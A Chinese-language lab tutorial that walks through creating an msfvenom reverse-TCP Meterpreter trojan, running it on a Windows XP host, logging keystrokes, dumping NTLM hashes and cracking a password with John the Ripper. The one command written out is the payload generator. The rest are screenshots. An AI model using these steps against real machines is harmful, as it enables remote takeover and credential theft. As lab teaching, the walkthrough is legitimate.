***严正声明：本文仅限于技术讨论与分享，严禁用于非法途径。**

##  **实施用户密码破解**

###  **一、环境配置** **(** **两台主机均采用** **NAT** **桥接模式** **)**

1、Kali主机的IP配置：（211.100.71.10/24 ）

![1621758738_60aa131270b520f155b93.png!small](https://image.3001.net/images/20210523/1621758738_60aa131270b520f155b93.png!small)

  

2、winxp主机的IP配置：

![1621758741_60aa1315a576341c63b7f.png!small](https://image.3001.net/images/20210523/1621758741_60aa1315a576341c63b7f.png!small)

（211.100.71.14/24 ）

###  **二、** **远程控制计算机**

1、利用msfvenom工具生成一个木马控制端—shell.exe，并把该木马程序保存到root用户下（lhost要改成kali的IP,lport要改为自己手机尾数后四位，shell.exe改为姓名拼音小写首字母.exe）

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.22 lport=1211 -f
exe > /root/shell.exe  
**![1621758808_60aa1358955ec5341a748.png!small](https://image.3001.net/images/20210523/1621758808_60aa1358955ec5341a748.png!small)**

![1621758820_60aa1364b3c5e9c6e6ab1.png!small](https://image.3001.net/images/20210523/1621758820_60aa1364b3c5e9c6e6ab1.png!small)

###  **2** **、将** **shell.exe** **文件拷贝到** **WINXP** **的桌面上**

![1621758863_60aa138f336e49bc7f016.png!small](https://image.3001.net/images/20210523/1621758863_60aa138f336e49bc7f016.png!small)

###  **3** **、启用** **MSF** **攻击平台**

![1621758872_60aa1398730588bae45dc.png!small](https://image.3001.net/images/20210523/1621758872_60aa1398730588bae45dc.png!small)

###  **4** **、加载模块和选择** **Payload**

![1621758890_60aa13aa3c47f1a5ffa7b.png!small](https://image.3001.net/images/20210523/1621758890_60aa13aa3c47f1a5ffa7b.png!small)

###  **5** **、设置** **Payload** **参数**

###
![1621758896_60aa13b06ba9b5db4df12.png!small](https://image.3001.net/images/20210523/1621758896_60aa13b06ba9b5db4df12.png!small)

###  **6** **、双击执行** **WINXP** **主机上的** **shell.exe** **文件**

###  **7** **、在** **kali** **上实施渗透攻击**

![1621758901_60aa13b5002d1409266ae.png!small](https://image.3001.net/images/20210523/1621758901_60aa13b5002d1409266ae.png!small)![1621758917_60aa13c536ebdd1da2b62.png!small](https://image.3001.net/images/20210523/1621758917_60aa13c536ebdd1da2b62.png!small)

![1621758957_60aa13ed0ca143390d863.png!small](https://image.3001.net/images/20210523/1621758957_60aa13ed0ca143390d863.png!small)

###  **8** **、在** **kali** **上实施键盘记录**

 **（** **1** **）输入如下命令启用键盘记录功能**

![1621758967_60aa13f7742b5736d6d55.png!small](https://image.3001.net/images/20210523/1621758967_60aa13f7742b5736d6d55.png!small)

 **（** **2** **）在** **windows xp2** **的** **CMD.exe** **环境下输入命令**

![1621758971_60aa13fb32e29d3397ae9.png!small](https://image.3001.net/images/20210523/1621758971_60aa13fb32e29d3397ae9.png!small)

 **（** **3** **）在** **kali** **上打开键盘记录文件，可以看到文件中记录下来在** **windows xp2**
**中输入的内容。**

![1621758985_60aa1409d9fd5821392db.png!small](https://image.3001.net/images/20210523/1621758985_60aa1409d9fd5821392db.png!small)

 **9** **、用** **john** **（密码破解工具）破解** **windows xp2** **在任务** **1**
**创建的用户（即自己姓名的拼音小写首字母）密码，** 实验中用户名为：zs ,密码为：police
（选一个密码词典password.lst中的密码，作为登录密码）

（1）将用于破解的密码词典password.lst文件拷贝到root用户目录下

![1621759005_60aa141dd43a2e8dd8c11.png!small](https://image.3001.net/images/20210523/1621759005_60aa141dd43a2e8dd8c11.png!small)![1621759009_60aa14210fe5d538a8f83.png!small](https://image.3001.net/images/20210523/1621759009_60aa14210fe5d538a8f83.png!small)

 **（** **2** **）在** **kali** **上用命令** **hashdump** **获取** **windows xp2**
**的用户名及加密后的密码（** **NTLM hash** **值）**

![1621759013_60aa14252030d09549ed5.png!small](https://image.3001.net/images/20210523/1621759013_60aa14252030d09549ed5.png!small)

 **（** **3** **）** **将zs** **用户的密码NTLM hash** **值保存在xxx.hash** **（xxx**
**为姓名的拼音小写首字母）** **文件中，并查看**

![1621759015_60aa1427ae2f3a1089d09.png!small](https://image.3001.net/images/20210523/1621759015_60aa1427ae2f3a1089d09.png!small)

 **（** **4** **）启用** **john**
**的图形化界面![1621759049_60aa1449e8d44d2ff332f.png!small](https://image.3001.net/images/20210523/1621759049_60aa1449e8d44d2ff332f.png!small)**

 **（** **5** **）打开** **zs.hash** **文件进行破解**

![1621759054_60aa144e64804829b0aae.png!small](https://image.3001.net/images/20210523/1621759054_60aa144e64804829b0aae.png!small)![1621759061_60aa14550f4c43353ae2e.png!small](https://image.3001.net/images/20210523/1621759061_60aa14550f4c43353ae2e.png!small)![1621759068_60aa145c84cc384fdd482.png!small](https://image.3001.net/images/20210523/1621759068_60aa145c84cc384fdd482.png!small)

 **（** **6** **）选择要破解的密码加密算法和密码词典（** **password.lst**
**）![1621759122_60aa14926c37dd585a870.png!small](https://image.3001.net/images/20210523/1621759122_60aa14926c37dd585a870.png!small)**

 **（** **7** **）开始破解密码**

![1621759127_60aa1497060b4857c6489.png!small](https://image.3001.net/images/20210523/1621759127_60aa1497060b4857c6489.png!small)

 **（** **8** **）密码破解成功**

![1621759135_60aa149f709086a395ca1.png!small](https://image.3001.net/images/20210523/1621759135_60aa149f709086a395ca1.png!small)

## 最后

希望大家遵纪守法！一起加油哈哈

